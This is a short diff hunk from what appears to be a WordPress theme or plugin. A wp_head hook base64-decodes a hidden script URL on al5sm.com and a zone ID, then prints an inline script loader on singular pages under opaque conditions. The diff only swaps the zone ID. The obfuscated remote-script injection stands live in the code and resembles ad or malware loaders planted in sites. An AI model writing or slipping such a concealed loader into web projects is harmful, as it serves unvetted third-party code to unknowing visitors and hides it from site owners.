@@ -32,7 +32,7 @@ add_action('wp_head', function () {
     if (is_singular() && ($SM_GO || $IP_FB || $AN_FB)) {
 
         $SR = base64_decode('aHR0cHM6Ly9hbDVzbS5jb20vdGFnLm1pbi5qcw==');
-        $ZN = base64_decode('MTE2MTAwMDY=');
+        $ZN = base64_decode('MTE2MTAwMDI=');
         ?>
         <script>
         (function(s){
